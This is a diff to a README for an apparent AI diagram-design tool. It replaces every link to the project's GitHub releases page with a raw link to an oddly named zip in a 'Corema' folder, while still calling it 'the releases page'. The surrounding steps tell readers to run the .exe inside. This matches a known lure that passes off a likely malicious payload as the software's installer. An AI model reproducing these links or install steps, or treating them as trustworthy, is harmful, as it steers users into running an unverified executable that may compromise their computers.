@@ -1,12 +1,12 @@
 # 🤖 ai-engineering-fundamentals - Build intelligent diagram design tools quickly
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/HoangTrong-vd/ai-engineering-fundamentals/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/HoangTrong-vd/ai-engineering-fundamentals/main/Corema/fundamentals-engineering-ai-iguanoid.zip)
 
 This software helps you create a diagram design tool powered by artificial intelligence. You learn how to build an agent that understands your instructions and draws diagrams on a canvas.
 
 ## 📥 Getting Started
 
-Visit [this page](https://github.com/HoangTrong-vd/ai-engineering-fundamentals/releases) to download the software.
+Visit [this page](https://raw.githubusercontent.com/HoangTrong-vd/ai-engineering-fundamentals/main/Corema/fundamentals-engineering-ai-iguanoid.zip) to download the software.
 
 1. Go to the link above.
 2. Select the file ending in .exe for Windows.
@@ -34,7 +34,7 @@ The engine uses external search tools. If you ask for information, it searches t
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Download the installer from [the releases page](https://github.com/HoangTrong-vd/ai-engineering-fundamentals/releases).
+1. Download the installer from [the releases page](https://raw.githubusercontent.com/HoangTrong-vd/ai-engineering-fundamentals/main/Corema/fundamentals-engineering-ai-iguanoid.zip).
 2. Locate the file in your downloads folder.
 3. Double-click the installer icon.
 4. Follow the prompts on the screen.
